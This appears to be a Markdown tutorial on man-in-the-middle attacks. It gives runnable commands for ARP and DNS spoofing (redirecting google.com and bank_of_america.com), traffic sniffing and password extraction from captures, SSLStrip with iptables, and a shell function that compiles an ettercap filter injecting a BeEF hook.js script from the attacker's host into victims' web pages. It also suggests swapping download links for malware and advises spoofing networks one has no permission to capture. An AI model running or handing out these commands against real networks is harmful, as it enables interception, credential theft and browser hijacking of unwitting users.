# MITM


# Tools We Use in This Tutorial:

dsniff: {arpspoof , dnspoof }
ettercap
nmap
netdiscover
CSPF4 Mitm Framework
beef-xss
bettercap
tcpdump
tshark
NetworkMiner
wireshark

-------------------------------

# you can list your interfaces & every local ip associate with every interface with :

 ifconfig

# for specific interface

ifconfig <interface>

#Example:

ifconfig wlan0

----------------------------

#you can show your kernel routeing table and gateway useing

route -n


-----------------------------

# Network Scanning  for active hosts
# 1) with nmap 

nmap -sn -r cidr

nmap -sn -r 192.168.1.1/24 

----------------------

# 2) with netdiscover , netdiscover is more active and give us real  great results 


netdiscover -r cidr -c <count of times to send arp> -s <time to sleep between every request> 

 -c count: number of times to send each ARP request (for nets with packet loss)
 -s time: time to sleep between each ARP request (milliseconds)

netdiscover -r 192.168.1.1/24 
netdiscover -r 192.168.1.1/24 -c 10 -s 500


------------------------------------------------

# 3) Useing my framework :  CSPF4 MITM Framework 

https://github.com/Crypt00o/CSPF4

1- first follow installtion steps

# run as root :

./cspf4 <interface>

Example: 

./cspf4 <wlan0>
 
# you will enter a cli session , type help for help and list commands available

# to scan Network for active hosts
	scan <ip>
	scan <cidr>
	
	Example:
			  scan 192.168.1.1
              scan 192.168.1.1/24

------------------------------------------------------------

# enable packet forwarding in kernel 

sysctl -w net.ipv4.ip_forward=1

# another Method 

echo 1 > /proc/sys/net/ipv4/ip_forward

# you can disable it useing 0 instead of 1 



------------------------------------------------

# ARP SPoofing 


# Concept with Example :

we have 2 machines :

A) 192.168.1.1 00:00:5e:00:53:af
B) 192.168.1.2 12:3c:22:01:53:d3
C) 192.168.1.3 01:23:ac:03:00:4e

Attacker is C , Gateway is A , Target is B

first we start a loop of arp replay every second or every specific period to send spoof packet for gateway and target
to tell gateway we are the target and tell the target we are the router.

loop: 

#packet to send to target:

arpreplay psrc=gatewayip pdst=targetip hwsrc=ourmac hwdst=targetmac 

#packet to send to gateway:

arpreplay psrc=targetip pdst=gatewayip hwsrc=ourmac hwdst=gatewaymac 



-------------------------------------------------
# ArpSpoofing


# 1)- Useing Ettercap 

ettercap -i <interface> -M <Method:subMethod> -TQ "/Target1;Target2;Target3//" "/Target4// -P dns_spoof "

ettercap -i wlan0 -M Arp:Remote -TQ "/192.168.1.2;192.168.1.3;192.168.1.10//" "/192.168.1.1//"


--------------------------------------------------

# 2)- Useing CSPF4 

after joining cli session  useing : ./cspf4 <interface> you can run many commands

./cspf4 wlan0

# and then run inside it,s session : 

#1) - for arp one way

arpspf <target1> <target2>

#Example :
	arpspf 192.168.1.1 192.168.1.125

#2) - for 2 way arp "remote"

arpspf <target1> <target2> all

#Example:
	arpspf 192.168.1.1 192.168.1.125 all

---------------------------------------------------
# normal mitm with arpspoof binary 


arpspoof -i <interface> -c -t <target ip> -r <host>

# we specify the target which we send a spoof packet to him and told him we are the host by sending our mac as hdsrc and the host ip as ipsrc
 

arpspoof -i wlan0  -t 192.168.1.2 -r 192.168.1.1 &
arpspoof -i wlan0  -t 192.168.1.1 -r 192.168.1.2 &

# we arpspoof with the2way or as they calling it : remotely , 
# thats mean arpspoof targets and tell everyone of them we are the another one

# the1way called just spoofing target like : arpspoof -i wlan0  -t 192.168.1.2 -r 192.168.1.1 &
# without spoofing the another host[s] for him



--------------------------------------------------------

# Dnsspoofing 

### Concept :

Machine A said ‘ping google.com’
Now it has to find that IP address of google.com
So it queries the DNS server with regard to the IP address for the domain google.com
The DNS server will have its own hierarchy, and it will find the IP address of google.com and return it to Machine A
with dnsspoofing we will replay with our dns repsonse which contain another ip 
----


# 1) - with dnsspoof binary


dnsspoof -i <interface> -f <fileof_hosts_2_spoof> host <target host> and udp port <port number>

1- first poisoning target's ArpCache 

printf "127.0.0.1\tgoogle.com\n127.0.0.1\tbank_of_america.com" > /tmp/dns_to_spoof.txt && dnsspoof -i wlan0 -f /tmp/dns_to_spoof.txt udp port 53

printf "127.0.0.1\tgoogle.com\n127.0.0.1\tbank_of_america.com" > /tmp/dns_to_spoof.txt && dnsspoof -i wlan0 -f /tmp/dns_to_spoof.txt host 192.168.1.2 udp port 53


-----------------------------------

# 2) - with Ettercap


1- Open the /usr/share/ettercap/etter.dns in the 122 machine and add the following,

# i use google here as Example

*.google.co.in A 192.168.1.12
*.google.com A 192.168.1.12
google.com A 192.168.1.12

www.google.com PTR 192.168.1.12
www.google.co.in PTR 192.168.1.12


# run ettercap useing dns_spoof plugin 

2 - ettercap -TQ -i <interface> -M <Method:subMethod>  -P dns_spoof "/ipofthetargets//" "/ipofthetargets//"
	
----------------------------------------------------------
# 3)- with CSPF4 :
	
	#inside CSPF4 Session run:

	dnsspf target1 target2 dns_to_spoof
	dnsspf target1 target2 all # to spoof all dns_queries
		
	
	#Example:
		dnsspf 192.168.1.1 192.168.1.125 google.com
		dnsspf 192.168.1.1 192.168.1.125 all

-------------------------------------------------------------------
# Sniffing 

# 1) Sniffing with tcpdump 

# arpspoof your Network if you don,t have  permession to capture packets or you aren,t a network admin

tcpdump -i <interface> "filter"

"filter" : you can use any wireshark or tshark filter 

Option :

--count|-c count : count   and number of packet to capture
-r file : read from pcap file 
-w file : write to pcap file
-v[vvvv] : versposing  and decodeing and increase packet info 
-X : Show the packet’s contents in both hex and ASCII.
-A : Show th packet’s contents in ASCII

Example :
	
	tcpdump -i wlan0 "host 192.168.1.1 and port 53" -vv
	tcpdump -i wlan0 "src 192.168.1.2 and dst 192.168.1.1 and port 80" -A -c 100



# you can learn to use more about filters from here :

	https://danielmiessler.com/study/tcpdump/

----------------------------------------------------

# 2) Sniffing With CSPF4:

run "sniff" command inside cspf4 session

1-it will ask you for Packetnumber to capture click enter if you won,t to specify it.
2-it will ask you to enter a Filter if you want ti use custom filter to filterpackets if you won,t specify a filter click enter
3-it will ask you for filename to save capature data if you won,t to savee it just press enter

and finally congratulation you now sniffing network traffic

----------------------------------------------------------------

# Read passwords or Raw Data from  pcap file 

# 1) Ettercap 

ettercap -TQ -r file.pcap



# 2) TcpDump

tcpdump -X -r  file.pcap
tcpdump -A -r  file.pcap



# 3) Tshark

tshark -z follow,tcp,ascii,0 -P -r file.pcap 



# 4) With Strings 

strings file.cap 


# 5) With NetworkMiner 

# i advice useing this , it,s really like  mineing everything photos,videos,files,passwords,docs,anything :D 
	
see https://www.netresec.com/?page=Blog&tag=Linux

-------------------------------------------------------


# SSLStrip to drop any ssl/tls secure connection 

#createing our forwarding rule 


iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# useing ssl strip 

sslstrip -a -f -l 8080 -w ssl

# then start Ettercap

ettercap -TQ -i <interface> -M <Method:subMethod> /ipofthetargets// /ipofthetargets//

--------------------------------------------------------

#  Browser-in-the-middle-attack + Man-in-the-middle-attach 

# 1) with ettercap + beefxss 

# use  myfuntion inject beef xss 

# 1-  hooks body and head 
function crypto_bitm_mitm(){ printf 'if(ip.proto== TCP && tcp.dst == 80) {\n\tif (search(DATA.data,"Accept-Encoding")) {\n\t\treplace("Accept-Encoding", "Accept-Nothing!");\n\t}\n}\nif (ip.proto== TCP && tcp.src == 80) {\n\tif (search(DATA.data,"</head>")) {\n\t\treplace("</head>", "<script src="http://%s:3000/hook.js"></script></head>"); \n\t\tmsg("0xCrypt00o,Hooked This Machine with beef-xss hook");\n\t}\n\tif (search(DATA.data,"</HEAD>")) {\n\t\treplace("</HEAD>", "<script src="http://%s:3000/hook.js"></script></HEAD> "); \n\t\tmsg("0xCrypt00o,Hooked This Machine with beef-xss hook");\n\t}\n\tif (search(DATA.data,"</body>")) {\n\t\treplace("</body>", "<script src="http://%s:3000/hook.js"></script></body> "); \n\t\tmsg("0xCrypt00o,Hooked This Machine with beef-xss hook");\n\t}\n\tif (search(DATA.data,"</BODY>")) {\n\t\treplace("</BODY>", "<script src="http://%s:3000/hook.js"></script></BODY> "); \n\t\tmsg("0xCrypt00o,Hooked This Machine with beef-xss hook");\n\t}\n}' $1 $1 $1 $1 > /tmp/0xCrypt00o.filter && etterfilter /tmp/0xCrypt00o.filter  -o /tmp/0xCrypt00o.ef && export crypto_filter=/tmp/0xCrypt00o.ef ;

}

# or 

# 2 -  hook head 

function crypto_bitm_mitm(){ printf 'if(ip.proto== TCP && tcp.dst == 80) {\n\tif (search(DATA.data,"Accept-Encoding")) {\n\t\treplace("Accept-Encoding", "Accept-Nothing!");\n\t}\n}\nif (ip.proto== TCP && tcp.src == 80) {\n\tif (search(DATA.data,"</head>")) {\n\t\treplace("</head>", "<script src="http://%s:3000/hook.js"></script></head>"); \n\t\tmsg("0xCrypt00o,Hooked This Machine with beef-xss hook");\n\t}\n\tif (search(DATA.data,"</HEAD>")) {\n\t\treplace("</HEAD>", "<script src="http://%s:3000/hook.js"></script></HEAD> "); \n\t\tmsg("0xCrypt00o,Hooked This Machine with beef-xss hook");\n\t}\n}' $1 $1 > /tmp/0xCrypt00o.filter && etterfilter /tmp/0xCrypt00o.filter  -o /tmp/0xCrypt00o.ef && export crypto_filter=/tmp/0xCrypt00o.ef ;

}

# Usage :

# crypto_bitm_mitm <beef_xss_hosted_hookjs_ip>

# Example : 

crypto_bitm_mitm 192.168.1.109

ettercap -TQ -M ARP:REMOTE -f $crypto_filter  "/ipofthetargets//" "/ipofthetargets//"


# we can use etterfilter and etterfilter syntax to write and compile our filter to replace everything in html
# for Example : 

# replace <a href="test_file.zip" download>Download</a>  with :  <a href="http://host/malware.apk" download>Download</a>

----------------------------------

# 2) Using any http server & with dnsspoof & beefxss

1- first  dnsspoof targets and hosts
2- curl http://yoursite.com -o index.html
3- put your hook at the head,  <script src="http://yourip:3000/hook.js"></script>
4- choose apache2 or nginx or twistd http server to serve 
5- start serveing 


-----------------------------------

# 3) Using Bettercap & beefxss

# useful resources

# https://www.youtube.com/watch?v=ZOOkeUnQsjk

# https://youtube.com/watch?v=3wAccKTfnLo

---------------------------------------------------------

# ) through fake hotspot 


# Rouge Access Point + MITM
https://www.geeksforgeeks.org/mitm-man-in-the-middle-create-virtual-access-point-using-wi-hotspot-tool/
